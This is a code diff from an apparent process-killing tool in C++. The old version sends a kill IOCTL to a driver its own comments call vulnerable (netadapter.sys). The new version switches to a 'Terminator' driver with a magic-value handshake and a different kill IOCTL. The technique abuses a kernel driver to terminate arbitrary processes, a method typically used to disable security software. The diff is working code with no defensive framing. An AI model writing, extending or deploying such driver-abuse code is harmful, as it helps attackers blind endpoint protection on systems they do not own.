@@ -260,31 +260,47 @@ bool ProcessKiller::IsProcessRunning(DWORD pid) {
 // IOCTL dispatch
 // ---------------------------------------------------------------------------
 
-// Sends the kill IOCTL to the loaded kernel driver.
-// The 1036-byte input buffer has the target PID in the first 4 bytes; the rest
-// is zero-padding required by the vulnerable driver's dispatch routine.
-// IOCTL code 0x22201C is the process-termination handler in netadapter.sys.
+static constexpr DWORD IOCTL_TERMINATOR_HANDSHAKE = 0x00222008;
+static constexpr DWORD IOCTL_TERMINATOR_KILL = 0x00222018;
+static constexpr DWORD TERMINATOR_MAGIC_ALIVE = 0x77777777;
+
+bool ProcessKiller::InitializeTerminator(HANDLE hDriver) {
+    if (hDriver == INVALID_HANDLE_VALUE) return false;
+
+    DWORD input = TERMINATOR_MAGIC_ALIVE;
+    DWORD output = 0;
+    DWORD returned = 0;
+    if (!DeviceIoControl(hDriver, IOCTL_TERMINATOR_HANDSHAKE,
+                         &input, sizeof(input),
+                         &output, sizeof(output),
+                         &returned, nullptr)) {
+        return false;
+    }
+
+    return returned >= sizeof(DWORD) && output == 1;
+}
+
 bool ProcessKiller::SendIOCTL(HANDLE hDriver, DWORD pid) {
     if (hDriver == INVALID_HANDLE_VALUE) {
         return false;
     }
 
-    // Layout: [DWORD pid][1032 bytes padding]
-    std::vector<BYTE> buffer(1036, 0);
-    *reinterpret_cast<DWORD*>(buffer.data()) = pid;
-
-    DWORD bytesReturned = 0;
-    BOOL result = DeviceIoControl(
+    DWORD status = 0;
+    DWORD returned = 0;
+    const BOOL accepted = DeviceIoControl(
         hDriver,
-        0x22201C,                          // Vulnerable driver IOCTL — process kill
-        buffer.data(),
-        static_cast<DWORD>(buffer.size()),
-        nullptr, 0,                        // No output buffer needed for this IOCTL
-        &bytesReturned,
+        IOCTL_TERMINATOR_KILL,
+        &pid,
+        sizeof(pid),
+        &status,
+        sizeof(status),
+        &returned,
         nullptr
     );
 
-    return result != FALSE;
+    return accepted != FALSE
+        && returned >= sizeof(status)
+        && static_cast<LONG>(status) >= 0;
 }
 
 // Thin wrapper so callers don't need to know the IOCTL details.
